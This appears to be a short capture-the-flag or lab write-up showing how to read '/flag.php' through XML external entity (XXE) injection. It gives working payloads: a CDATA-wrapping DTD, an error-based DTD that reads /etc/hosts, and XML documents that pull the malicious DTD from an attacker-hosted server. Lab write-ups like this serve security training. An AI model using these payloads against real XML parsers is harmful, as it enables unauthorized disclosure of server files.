# [Advanced File Disclosure](Advanced%20File%20Disclosure.md)
### Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

Payload `xxe.dtd`
```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```

XML payload
```xml
<!DOCTYPE email [
  <!ENTITY % dtd SYSTEM
  "http://10.10.16.10:8000/xxe.dtd">
  %dtd;
  %all;
]>
.
.
.
<email>
&fileContents;
</email>
```
![](Screenshot%202026-07-23%20at%2015.14.56.png)
___

Payload `error-based`
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts"> 
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

XML payload
```xml
<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
	%remote; 
	%error; 
]>
```
![](Screenshot%202026-07-23%20at%2015.19.58.png)